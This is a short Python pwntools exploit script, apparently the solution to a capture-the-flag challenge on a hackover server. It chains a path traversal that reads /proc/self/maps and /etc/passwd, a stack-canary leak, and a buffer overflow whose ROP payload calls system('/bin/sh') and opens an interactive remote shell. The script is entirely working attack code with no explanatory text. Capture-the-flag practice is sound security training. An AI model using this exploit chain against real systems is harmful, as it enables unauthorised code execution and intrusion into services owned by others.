from pwn import *
import time

# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc.so.6')
# HOST, PORT = '0.0.0.0', 6500
HOST, PORT = 'challenges.hackover.h4q.it', 31337

r = remote(HOST, PORT)

r.recvuntil('> ')
r.sendline('1')
r.recvuntil('> ')
r.sendline('../../../../../../../../proc/self/maps')
maps = r.recvuntil('> ')
for line in maps.split('\n'):
	if 'libc' in line:
		break

libc_base = int(line.split('-')[0], 16)
binsh = libc_base + list(libc.search('/bin/sh'))[0]
system = libc_base + libc.symbols['system']
r.sendline('n')
r.recvuntil('> ')
r.sendline('1')
r.recvuntil('> ')
r.sendline('../../../../../../../../etc/passwd')
r.recvuntil('> ')
r.sendline('s%d' % (30728 + 1))
r.recvuntil('\n\n\n')
data = r.recvline()[:-1]
data = '\x00' + data[:7]
canary = u64(data)
payload = 'n' * 0x7A28 + p64(canary) + p64(0) + p64(0x401233) + p64(binsh) + p64(system)
print hex(canary)
r.sendline(payload)
r.interactive()